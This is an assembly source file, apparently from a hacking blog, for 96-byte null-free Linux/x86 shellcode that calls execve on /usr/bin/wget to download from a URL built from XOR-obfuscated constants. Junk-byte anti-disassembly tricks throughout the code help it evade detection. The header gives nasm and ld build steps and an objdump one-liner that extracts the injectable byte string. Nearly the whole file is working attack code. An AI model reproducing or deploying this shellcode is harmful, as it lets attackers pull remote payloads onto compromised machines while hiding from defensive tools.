; Mutated Execve Wget - Assembly Language - Linux/x86
; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.


;   mutated_execve_wget
;
;   * 96 bytes
;   * null-free
;   * mutated isn't polymorphic (shellcode does not replicate itself to be called polymorphic)
;
;
;   # nasm -f elf32 mutated_execve_wget.asm
;   # ld -m elf_i386 mutated_execve_wget.o -o mutated_execve_wget
;   # for i in $(objdump -d mutated_execve_wget |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
;   
;   Testing
;   # ./mutated_execve_wget


global _start

section .text

_start:
	; int execve(const char *path, char *const argv[], char *const envp[]);
	; execve(["/usr/bin/wget", 0], [["/usr/bin/wget", 0], "url", 0], 0)

	jmp $+3
	db 0xe8
	sub ebx, ebx
	jz $+3
	db 0x83
	mul ebx
	mov ebp, -11


	jmp $+3
	db 0xe8
	push 0x72456541
	sub esi, esi
	jz $+3
	db 0x83
	pop esi
	push esi
	xor esi, 0x3e1f4a25
	push esi
	
	jmp $+3
	db 0x33
	push 0x672e7369
	mov [esp+12], eax
	mov ecx, esp


	; /usr/bin/wget

	push 0x74
	jmp $+3
	db 0xe3
	push 0x6567772f
	jmp $+3
	db 0x83
	push 0x6e69622f
	jmp $+3
	db 0x33
	push 0x7273752f
	lea ebx, [esp]

	jmp $+3
	db 0x83
	push eax
	push ecx		; argv address
	push ebx		; file name address
	mov ecx, esp		; pointer to the file name and argv

	neg ebp

	xchg eax, ebp
	jmp $+3
	db 0x83
	int 0x80
